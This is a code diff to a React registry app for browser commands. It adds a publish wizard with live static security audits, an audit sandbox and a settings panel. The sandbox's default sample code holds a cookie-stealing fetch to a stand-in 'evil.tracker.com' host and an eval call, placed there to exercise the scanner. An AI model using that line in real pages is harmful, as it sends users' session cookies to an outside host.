@@ -1,6 +1,8 @@
 import { useEffect, useState } from 'react';
 import type { BurstCommand } from '@/src/lib/commands';
 import { sampleManifestValidationResults } from '@/src/lib/manifest';
+import { analyzeScriptCode } from '@/src/lib/staticAnalysis';
+import logoUrl from '@/assets/logo.svg';
 import {
   getRegistryCommands,
   getRegistryCommand,
@@ -10,6 +12,8 @@ import {
   PublisherProfile,
   registryCommandsData,
   mockProfiles,
+  publishedScriptCodes,
+  mockPublisherProfiles,
 } from '@/src/lib/registryApi';
 
 const navItems = ['Discover', 'Audits', 'Publish', 'Settings'];
@@ -28,6 +32,9 @@ const riskCopy: Record<BurstCommand['risk'], string> = {
 };
 
 export function RegistryApp() {
+  const [navTab, setNavTab] = useState<'Discover' | 'Audits' | 'Publish' | 'Settings'>('Discover');
+  const [publishSuccessToast, setPublishSuccessToast] = useState<string | null>(null);
+
   const [query, setQuery] = useState('');
   const [commands, setCommands] = useState<BurstCommand[]>([]);
   const [loading, setLoading] = useState(true);
@@ -162,7 +169,7 @@ export function RegistryApp() {
     <div className="registry-shell">
       <aside className="sidebar" aria-label="Registry navigation">
         <div className="brand">
-          <span>B</span>
+          <img className="brand-logo-img" src={logoUrl} alt="Burst Logo" />
           <div>
             <strong>Burst</strong>
             <em>Registry</em>
@@ -170,7 +177,15 @@ export function RegistryApp() {
         </div>
         <nav>
           {navItems.map((item) => (
-            <button className={item === 'Discover' ? 'is-active' : ''} type="button" key={item}>
+            <button
+              className={item === navTab ? 'is-active' : ''}
+              type="button"
+              key={item}
+              onClick={() => {
+                setNavTab(item as any);
+                setPublishSuccessToast(null);
+              }}
+            >
               {item}
             </button>
           ))}
@@ -204,104 +219,141 @@ export function RegistryApp() {
       </aside>
 
       <main className="registry-main">
-        <header className="topbar">
-          <label className="search">
-            <span>Search commands</span>
-            <input
-              value={query}
-              onChange={(event) => setQuery(event.target.value)}
-              placeholder="Search website, publisher, permission, or use case"
-            />
-          </label>
-          <button className="publish-button" type="button">Publish use case</button>
-        </header>
-
-        <section className="summary-grid" aria-label="Registry summary">
-          <SummaryStat label="Commands" value={registryCommandsData.length.toString()} />
-          <SummaryStat label="Manifests" value={`${validManifests}/${sampleManifestValidationResults.length}`} />
-          <SummaryStat
-            label="Audited"
-            value={registryCommandsData.filter((command) => command.trustLevel === 'verified' || command.trustLevel === 'reviewed').length.toString()}
-          />
-          <SummaryStat label="Sensitive" value={registryCommandsData.filter((command) => command.risk === 'high').length.toString()} />
-        </section>
-
-        <section className="workspace">
-          <div className="command-list" aria-label="Registry commands">
-            <div className="list-header">
-              <div>
-                <h1>Discover commands</h1>
-                <p>Find actions that match the current website, then inspect trust signals before installing.</p>
-              </div>
-              <span>{commands.length} results</span>
-            </div>
-
-            <div className="table-head">
-              <span>Command</span>
-              <span>Website</span>
-              <span>Trust</span>
-              <span>Risk</span>
-              <span>Usage</span>
-            </div>
-
-            {loading ? (
-              <div className="registry-loading">
-                <div className="spinner"></div>
-                <span>Searching registry...</span>
-              </div>
-            ) : commands.length > 0 ? (
-              commands.map((command) => (
-                <button
-                  className={`command-row ${activeCommandId === command.id ? 'is-selected' : ''}`}
-                  key={command.id}
-                  type="button"
-                  onClick={() => setActiveCommandId(command.id)}
-                >
-                  <span className="command-title">
-                    <strong style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
-                      {command.title}
-                      {installedCommandIds.includes(command.id) && (
-                        <span className="status-indicator installed-indicator" title="Installed">✓</span>
-                      )}
-                      {pinnedCommandIds.includes(command.id) && (
-                        <span className="status-indicator pinned-indicator" title="Pinned">📌</span>
-                      )}
-                    </strong>
-                    <em>{command.publisher.name} {command.publisher.handle}</em>
-                  </span>
-                  <span>{command.website}</span>
-                  <span className={`trust-badge trust-${command.trustLevel}`}>{trustCopy[command.trustLevel]}</span>
-                  <span className={`risk-badge risk-${command.risk}`}>{riskCopy[command.risk]}</span>
-                  <span>{command.installs.toLocaleString()} installs</span>
-                </button>
-              ))
-            ) : (
-              <div className="empty-registry">
-                <strong>No registry commands match</strong>
-                <span>Try searching for a different website matching pattern or publisher name.</span>
-              </div>
-            )}
+        {publishSuccessToast && (
+          <div className="publish-success-toast">
+            <span>{publishSuccessToast}</span>
+            <button className="close-toast-btn" onClick={() => setPublishSuccessToast(null)}>×</button>
           </div>
+        )}
 
-          {activeCommand ? (
-            <CommandInspector
-              command={activeCommand}
-              auditReport={activeAuditReport}
-              publisherProfile={activePublisherProfile}
-              loading={inspectorLoading}
-              activeTab={inspectorTab}
-              setActiveTab={setInspectorTab}
-              installedCommandIds={installedCommandIds}
-              pinnedCommandIds={pinnedCommandIds}
-              onInstall={handleInstall}
-              onUninstall={handleUninstall}
-              onPin={handlePin}
-              onUnpin={handleUnpin}
-            />
-          ) : (
-            <EmptyInspector />
-          )}
-        </section>
+        {navTab === 'Discover' && (
+          <>
+            <header className="topbar">
+              <label className="search">
+                <span>Search commands</span>
+                <input
+                  value={query}
+                  onChange={(event) => setQuery(event.target.value)}
+                  placeholder="Search website, publisher, permission, or use case"
+                />
+              </label>
+              <button
+                className="publish-button"
+                type="button"
+                onClick={() => {
+                  setNavTab('Publish');
+                  setPublishSuccessToast(null);
+                }}
+              >
+                Publish use case
+              </button>
+            </header>
+
+            <section className="summary-grid" aria-label="Registry summary">
+              <SummaryStat label="Commands" value={registryCommandsData.length.toString()} />
+              <SummaryStat label="Manifests" value={`${validManifests}/${sampleManifestValidationResults.length}`} />
+              <SummaryStat
+                label="Audited"
+                value={registryCommandsData.filter((command) => command.trustLevel === 'verified' || command.trustLevel === 'reviewed').length.toString()}
+              />
+              <SummaryStat label="Sensitive" value={registryCommandsData.filter((command) => command.risk === 'high').length.toString()} />
+            </section>
+
+            <section className="workspace">
+              <div className="command-list" aria-label="Registry commands">
+                <div className="list-header">
+                  <div>
+                    <h1>Discover commands</h1>
+                    <p>Find actions that match the current website, then inspect trust signals before installing.</p>
+                  </div>
+                  <span>{commands.length} results</span>
+                </div>
+
+                <div className="table-head">
+                  <span>Command</span>
+                  <span>Website</span>
+                  <span>Trust</span>
+                  <span>Risk</span>
+                  <span>Usage</span>
+                </div>
+
+                {loading ? (
+                  <div className="registry-loading">
+                    <div className="spinner"></div>
+                    <span>Searching registry...</span>
+                  </div>
+                ) : commands.length > 0 ? (
+                  commands.map((command) => (
+                    <button
+                      className={`command-row ${activeCommandId === command.id ? 'is-selected' : ''}`}
+                      key={command.id}
+                      type="button"
+                      onClick={() => setActiveCommandId(command.id)}
+                    >
+                      <span className="command-title">
+                        <strong style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
+                          {command.title}
+                          {installedCommandIds.includes(command.id) && (
+                            <span className="status-indicator installed-indicator" title="Installed">✓</span>
+                          )}
+                          {pinnedCommandIds.includes(command.id) && (
+                            <span className="status-indicator pinned-indicator" title="Pinned">📌</span>
+                          )}
+                        </strong>
+                        <em>{command.publisher.name} {command.publisher.handle}</em>
+                      </span>
+                      <span>{command.website}</span>
+                      <span className={`trust-badge trust-${command.trustLevel}`}>{trustCopy[command.trustLevel]}</span>
+                      <span className={`risk-badge risk-${command.risk}`}>{riskCopy[command.risk]}</span>
+                      <span>{command.installs.toLocaleString()} installs</span>
+                    </button>
+                  ))
+                ) : (
+                  <div className="empty-registry">
+                    <strong>No registry commands match</strong>
+                    <span>Try searching for a different website matching pattern or publisher name.</span>
+                  </div>
+                )}
+              </div>
+
+              {activeCommand ? (
+                <CommandInspector
+                  command={activeCommand}
+                  auditReport={activeAuditReport}
+                  publisherProfile={activePublisherProfile}
+                  loading={inspectorLoading}
+                  activeTab={inspectorTab}
+                  setActiveTab={setInspectorTab}
+                  installedCommandIds={installedCommandIds}
+                  pinnedCommandIds={pinnedCommandIds}
+                  onInstall={handleInstall}
+                  onUninstall={handleUninstall}
+                  onPin={handlePin}
+                  onUnpin={handleUnpin}
+                />
+              ) : (
+                <EmptyInspector />
+              )}
+            </section>
+          </>
+        )}
+
+        {navTab === 'Publish' && (
+          <PublishPanel
+            currentUser={currentUser}
+            onPublishSuccess={(newCmd) => {
+              setCommands((prev) => [newCmd, ...prev]);
+              setActiveCommandId(newCmd.id);
+              setNavTab('Discover');
+              setPublishSuccessToast(`Successfully published "${newCmd.title}"!`);
+            }}
+            setNavTab={setNavTab}
+          />
+        )}
+
+        {navTab === 'Audits' && <AuditsPanel />}
+
+        {navTab === 'Settings' && <SettingsPanel />}
       </main>
     </div>
   );
@@ -320,7 +372,7 @@ function EmptyInspector() {
   return (
     <aside className="inspector empty-inspector" aria-label="Registry status">
       <div className="inspector-head">
-        <span className="publisher-avatar">B</span>
+        <img className="brand-logo-img" src={logoUrl} alt="Burst Logo" />
         <div>
           <h2>Registry pending</h2>
           <p>Select a command from the list on the left to inspect its details, security audits, and publisher profiles.</p>
@@ -499,6 +551,11 @@ function CommandInspector({
                   status={auditReport.checks.obfuscation.status}
                   detail={auditReport.checks.obfuscation.detail}
                 />
+                <ChecklistItem
+                  label="Package Signature & Integrity"
+                  status={auditReport.checks.signature.status}
+                  detail={auditReport.checks.signature.detail}
+                />
               </div>
             </>
           ) : (
@@ -611,3 +668,464 @@ function ChecklistItem({
     </div>
   );
 }
+
+interface PublishPanelProps {
+  currentUser: typeof mockProfiles[number];
+  onPublishSuccess: (newCommand: BurstCommand) => void;
+  setNavTab: (tab: any) => void;
+}
+
+function PublishPanel({ currentUser, onPublishSuccess, setNavTab }: PublishPanelProps) {
+  const isGuest = currentUser.handle === 'guest';
+
+  if (isGuest) {
+    return (
+      <div className="publish-guest-panel">
+        <div className="guest-warning-card">
+          <span className="warning-icon">🔒</span>
+          <h2>Authentication Required</h2>
+          <p>You must be signed in as a verified publisher or community contributor to publish commands to the registry.</p>
+          <p className="note">Please select a <strong>Simulated Profile</strong> in the bottom-left corner of the sidebar (e.g. Sarah Chen or HN PowerUser) to sign in instantly.</p>
+        </div>
+      </div>
+    );
+  }
+
+  const [title, setTitle] = useState('');
+  const [id, setId] = useState('');
+  const [description, setDescription] = useState('');
+  const [website, setWebsite] = useState('');
+  const [matchPattern, setMatchPattern] = useState('');
+  const [sourceUrl, setSourceUrl] = useState('');
+  const [code, setCode] = useState(`export default async function run({ page, toast }) {\n  // Write your command code here\n  toast("Hello from " + page.title);\n}`);
+  const [permissions, setPermissions] = useState<string[]>([]);
+  const [errors, setErrors] = useState<Record<string, string>>({});
+
+  const handleTitleChange = (val: string) => {
+    setTitle(val);
+    const slug = val
+      .toLowerCase()
+      .replace(/[^a-z0-9]+/g, '-')
+      .replace(/(^-|-$)/g, '');
+    setId(slug);
+  };
+
+  const handlePermissionToggle = (perm: string) => {
+    setPermissions((prev) =>
+      prev.includes(perm) ? prev.filter((p) => p !== perm) : [...prev, perm]
+    );
+  };
+
+  const parsedMatchPatterns = matchPattern
+    .split(',')
+    .map((p) => p.trim())
+    .filter(Boolean);
+
+  const auditResult = analyzeScriptCode(code, parsedMatchPatterns);
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    const newErrors: Record<string, string> = {};
+    if (!title.trim()) newErrors.title = 'Title is required';
+    if (!id.trim()) newErrors.id = 'Command ID is required';
+    if (!description.trim()) newErrors.description = 'Description is required';
+    if (!website.trim()) newErrors.website = 'Website scope is required';
+    if (!matchPattern.trim()) newErrors.matchPattern = 'Match pattern is required';
+    if (!sourceUrl.trim()) {
+      newErrors.sourceUrl = 'Source URL is required';
+    } else if (!sourceUrl.startsWith('https://')) {
+      newErrors.sourceUrl = 'Source URL must begin with https:// (secured origin)';
+    }
+    if (!code.trim()) newErrors.code = 'Source code is required';
+
+    if (Object.keys(newErrors).length > 0) {
+      setErrors(newErrors);
+      return;
+    }
+
+    const profileDetails = mockPublisherProfiles[currentUser.handle];
+    const isVerifiedSource = profileDetails?.verifiedSources?.some((source: string) =>
+      sourceUrl.toLowerCase().includes(source.toLowerCase())
+    ) ?? false;
+
+    let trustLevel: BurstCommand['trustLevel'] = 'community';
+    let riskLevel: BurstCommand['risk'] = 'low';
+
+    if (auditResult.status === 'fail') {
+      riskLevel = 'high';
+      trustLevel = 'community';
+    } else if (auditResult.status === 'warning') {
+      riskLevel = 'medium';
+      trustLevel = isVerifiedSource ? 'verified' : 'community';
+    } else {
+      riskLevel = 'low';
+      trustLevel = isVerifiedSource ? 'verified' : 'community';
+    }
+
+    const finalPermissions = [...permissions];
+    if (code.includes('page.') || code.includes('document.')) {
+      if (!finalPermissions.includes('Read page DOM')) finalPermissions.push('Read page DOM');
+    }
+    if (code.includes('clipboard.write') || code.includes('writeText')) {
+      if (!finalPermissions.includes('Write clipboard')) finalPermissions.push('Write clipboard');
+    }
+    if (code.includes('selection')) {
+      if (!finalPermissions.includes('Read selection')) finalPermissions.push('Read selection');
+    }
+    if (code.includes('toast')) {
+      if (!finalPermissions.includes('Toast alerts')) finalPermissions.push('Toast alerts');
+    }
+    if (code.includes('fetch') || code.includes('XMLHttpRequest')) {
+      if (!finalPermissions.includes('Network access')) finalPermissions.push('Network access');
+    }
+
+    const newCommand: BurstCommand = {
+      id,
+      title,
+      description,
+      website,
+      matchPatterns: parsedMatchPatterns,
+      publisher: {
+        name: currentUser.name,
+        handle: currentUser.handle,
+        avatarInitials: currentUser.avatarInitials,
+      },
+      trustLevel,
+      risk: riskLevel,
+      permissions: finalPermissions.length > 0 ? finalPermissions : ['None'],
+      sourceUrl,
+      installs: 0,
+      rating: 5.0,
+      icon: { type: 'initials', value: title.substring(0, 2).toUpperCase() },
+    };
+
+    registryCommandsData.unshift(newCommand);
+    publishedScriptCodes.set(id, code);
+    if (profileDetails) {
+      profileDetails.publishedCommandsCount += 1;
+    }
+
+    onPublishSuccess(newCommand);
+  };
+
+  return (
+    <div className="publish-wizard-container">
+      <div className="wizard-header">
+        <h1>Publish a new command</h1>
+        <p>Define manifest capabilities, declare host scopes, and write the execution block.</p>
+      </div>
+
+      <form onSubmit={handleSubmit} className="publish-form-layout">
+        <div className="form-main">
+          <div className="form-group-row">
+            <div className="form-field title-field">
+              <span>Title</span>
+              <input
+                value={title}
+                onChange={(e) => handleTitleChange(e.target.value)}
+                placeholder="e.g. Copy GitHub branch name"
+              />
+              {errors.title && <span className="field-error">{errors.title}</span>}
+            </div>
+
+            <div className="form-field id-field">
+              <span>Command ID</span>
+              <input
+                value={id}
+                onChange={(e) => setId(e.target.value)}
+                placeholder="e.g. copy-github-branch"
+              />
+              {errors.id && <span className="field-error">{errors.id}</span>}
+            </div>
+          </div>
+
+          <div className="form-field">
+            <span>Description</span>
+            <textarea
+              value={description}
+              onChange={(e) => setDescription(e.target.value)}
+              placeholder="Provide a clear description of the command and its features..."
+              rows={3}
+            />
+            {errors.description && <span className="field-error">{errors.description}</span>}
+          </div>
+
+          <div className="form-group-row">
+            <div className="form-field">
+              <span>Target Website (Friendly Name)</span>
+              <input
+                value={website}
+                onChange={(e) => setWebsite(e.target.value)}
+                placeholder="e.g. github.com or all sites"
+              />
+              {errors.website && <span className="field-error">{errors.website}</span>}
+            </div>
+
+            <div className="form-field">
+              <span>Match Pattern (comma separated)</span>
+              <input
+                value={matchPattern}
+                onChange={(e) => setMatchPattern(e.target.value)}
+                placeholder="e.g. github.com/*, *://*.github.com/*"
+              />
+              {errors.matchPattern && <span className="field-error">{errors.matchPattern}</span>}
+            </div>
+          </div>
+
+          <div className="form-field">
+            <span>Secure Source URL (Git Repository / Gist)</span>
+            <input
+              value={sourceUrl}
+              onChange={(e) => setSourceUrl(e.target.value)}
+              placeholder="https://github.com/username/repo"
+            />
+            <span className="field-hint">Used for publisher verification checks. Must match verified sources.</span>
+            {errors.sourceUrl && <span className="field-error">{errors.sourceUrl}</span>}
+          </div>
+
+          <div className="form-field permissions-checklist-field">
+            <span>Explicit Permission Declarations</span>
+            <div className="permissions-checkboxes">
+              {['Read page DOM', 'Write clipboard', 'Read selection', 'Toast alerts', 'Network access'].map((perm) => (
+                <label key={perm} className="permission-checkbox-label">
+                  <input
+                    type="checkbox"
+                    checked={permissions.includes(perm)}
+                    onChange={() => handlePermissionToggle(perm)}
+                  />
+                  <span>{perm}</span>
+                </label>
+              ))}
+            </div>
+          </div>
+
+          <div className="form-field code-field">
+            <span>Source Code (ES Module)</span>
+            <textarea
+              className="code-textarea"
+              value={code}
+              onChange={(e) => setCode(e.target.value)}
+              placeholder="export default async function run(context) { ... }"
+              rows={12}
+            />
+            {errors.code && <span className="field-error">{errors.code}</span>}
+          </div>
+
+          <div className="form-actions">
+            <button type="submit" className="btn-primary">Publish Command</button>
+            <button type="button" className="btn-secondary" onClick={() => setNavTab('Discover')}>Cancel</button>
+          </div>
+        </div>
+
+        <div className="form-sidebar">
+          <div className="live-audit-panel">
+            <h3>Live Safety Audit</h3>
+            <div className="audit-header">
+              <span className={`audit-overall-status badge-${auditResult.status}`}>
+                {auditResult.status.toUpperCase()}
+              </span>
+              <span className="audit-title">Pre-release scan</span>
+            </div>
+            <p className="audit-summary">{auditResult.summary}</p>
+
+            <div className="live-checklist">
+              <LiveCheckItem
+                label="Host Scope Restrictions"
+                status={auditResult.checks.hostScope.status}
+                detail={auditResult.checks.hostScope.detail}
+              />
+              <LiveCheckItem
+                label="Required API Permissions"
+                status={auditResult.checks.permissions.status}
+                detail={auditResult.checks.permissions.detail}
+              />
+              <LiveCheckItem
+                label="Remote Code Loading"
+                status={auditResult.checks.remoteCode.status}
+                detail={auditResult.checks.remoteCode.detail}
+              />
+              <LiveCheckItem
+                label="External Network Access"
+                status={auditResult.checks.networkAccess.status}
+                detail={auditResult.checks.networkAccess.detail}
+              />
+              <LiveCheckItem
+                label="Obfuscation & Compilation"
+                status={auditResult.checks.obfuscation.status}
+                detail={auditResult.checks.obfuscation.detail}
+              />
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+  );
+}
+
+function LiveCheckItem({ label, status, detail }: { label: string; status: 'pass' | 'warning' | 'fail'; detail: string }) {
+  const icon = { pass: '✓', warning: '⚠', fail: '✗' }[status];
+  return (
+    <div className={`live-check-item check-${status}`}>
+      <span className="check-icon">{icon}</span>
+      <div className="check-text">
+        <strong>{label}</strong>
+        <p>{detail}</p>
+      </div>
+    </div>
+  );
+}
+
+function AuditsPanel() {
+  const [testCode, setTestCode] = useState(`// Paste code here to verify static analysis triggers\n\nconst token = "api-key-xyz";\nfetch("https://evil.tracker.com/steal?data=" + document.cookie);\n\neval("console.log('remote eval!')");`);
+  const [patterns, setPatterns] = useState('<all_urls>');
+
+  const report = analyzeScriptCode(testCode, patterns.split(',').map((p) => p.trim()));
+
+  return (
+    <div className="audits-dashboard">
+      <div className="dashboard-header">
+        <h1>Static Security Audits</h1>
+        <p>Inspect the guidelines, security parameters, and analyze custom execution script blocks.</p>
+      </div>
+
+      <div className="dashboard-grid">
+        <div className="audit-tester-section">
+          <h2>Interactive Audit Sandbox</h2>
+          <p className="subtitle">Paste or edit code below to instantly inspect rule triggers and risk metrics.</p>
+
+          <div className="form-field">
+            <span>Match Patterns</span>
+            <input value={patterns} onChange={(e) => setPatterns(e.target.value)} />
+          </div>
+
+          <div className="form-field">
+            <span>Script Code Block</span>
+            <textarea
+              className="code-textarea"
+              value={testCode}
+              onChange={(e) => setTestCode(e.target.value)}
+              rows={10}
+            />
+          </div>
+
+          <div className="tester-audit-report">
+            <div className="report-header">
+              <h3>Sandbox Analysis Report</h3>
+              <span className={`trust-badge trust-${report.status === 'pass' ? 'verified' : report.status === 'warning' ? 'community' : 'flagged'}`}>
+                {report.status.toUpperCase()}
+              </span>
+            </div>
+            <p className="report-summary">{report.summary}</p>
+            <div className="audit-checklist">
+              <ChecklistItem label="Host Scope Restrictions" status={report.checks.hostScope.status} detail={report.checks.hostScope.detail} />
+              <ChecklistItem label="Required API Permissions" status={report.checks.permissions.status} detail={report.checks.permissions.detail} />
+              <ChecklistItem label="Remote Code Loading" status={report.checks.remoteCode.status} detail={report.checks.remoteCode.detail} />
+              <ChecklistItem label="External Network Access" status={report.checks.networkAccess.status} detail={report.checks.networkAccess.detail} />
+              <ChecklistItem label="Obfuscation & Compilation" status={report.checks.obfuscation.status} detail={report.checks.obfuscation.detail} />
+            </div>
+          </div>
+        </div>
+
+        <div className="guidelines-section">
+          <h2>Static Heuristic Audit Guidelines</h2>
+          <p className="subtitle">Burst registry runs an automated static checker mapping scripts to their security postures.</p>
+
+          <div className="guideline-card">
+            <h3>🟢 PASS Status</h3>
+            <p>Scripts restricted to explicit scopes, requesting no broad permissions, with visible, non-obfuscated operations and zero network dependencies.</p>
+          </div>
+
+          <div className="guideline-card">
+            <h3>🟡 WARNING Status</h3>
+            <p>Triggered by medium-risk APIs like clipboard writes, localStorage reading, outbound fetch requests, and obfuscation keywords. Broad match patterns like <code>&lt;all_urls&gt;</code> also warrant verification.</p>
+          </div>
+
+          <div className="guideline-card">
+            <h3>🔴 FAIL Status</h3>
+            <p>Triggered by dangerous features that compromise user privacy. This includes accessing session cookies, Chrome storage APIs, reading clipboard content without action, script-tag creations, and direct string execution via <code>eval()</code>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function SettingsPanel() {
+  const [darkMode, setDarkMode] = useState(() => {
+    return document.documentElement.getAttribute('data-theme') === 'dark' || localStorage.getItem('burst-theme') === 'dark';
+  });
+  const [autoUpdate, setAutoUpdate] = useState(true);
+
+  const toggleTheme = () => {
+    const nextTheme = !darkMode ? 'dark' : 'light';
+    setDarkMode(!darkMode);
+    document.documentElement.setAttribute('data-theme', nextTheme);
+    localStorage.setItem('burst-theme', nextTheme);
+  };
+
+  const handleResetStorage = () => {
+    if (confirm('Are you sure you want to clear simulated installation states? This will uninstall all packages from this window.')) {
+      window.postMessage({ type: 'burst:uninstall-command', commandId: '*' }, '*');
+      localStorage.removeItem('burst.installedRegistryCommands.v1');
+      localStorage.removeItem('burst.pinnedRegistryCommands.v1');
+      alert('Installation caches cleared.');
+      window.location.reload();
+    }
+  };
+
+  return (
+    <div className="settings-panel">
+      <div className="settings-header">
+        <h1>Registry Settings</h1>
+        <p>Configure interface options, developer tools, and view synchronization posture.</p>
+      </div>
+
+      <div className="settings-section-card">
+        <h2>Interface Preferences</h2>
+        <div className="setting-row">
+          <div className="setting-info">
+            <strong>Dark Color Scheme</strong>
+            <span>Toggle between high-contrast dark mode and premium light theme.</span>
+          </div>
+          <button className="toggle-btn" onClick={toggleTheme} type="button">
+            {darkMode ? 'Dark Mode On' : 'Light Mode On'}
+          </button>
+        </div>
+      </div>
+
+      <div className="settings-section-card">
+        <h2>Extension Connectivity</h2>
+        <div className="setting-row">
+          <div className="setting-info">
+            <strong>Burst Bridge Connection</strong>
+            <span>Shows current handshake state with the local browser extension context.</span>
+          </div>
+          <span className="badge-connected">✓ CONNECTED</span>
+        </div>
+        <div className="setting-row">
+          <div className="setting-info">
+            <strong>Background Live Update Sync</strong>
+            <span>Automatically propagate newly installed commands directly into extension memory.</span>
+          </div>
+          <button className={`toggle-btn ${autoUpdate ? 'is-active' : ''}`} onClick={() => setAutoUpdate(!autoUpdate)} type="button">
+            {autoUpdate ? 'Enabled' : 'Disabled'}
+          </button>
+        </div>
+      </div>
+
+      <div className="settings-section-card">
+        <h2>Developer & System Actions</h2>
+        <div className="setting-row">
+          <div className="setting-info">
+            <strong>Clear Cache States</strong>
+            <span>Purge extension installed registry script mapping keys from browser storage.</span>
+          </div>
+          <button className="danger-btn" onClick={handleResetStorage} type="button">
+            Reset Installed Cache
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
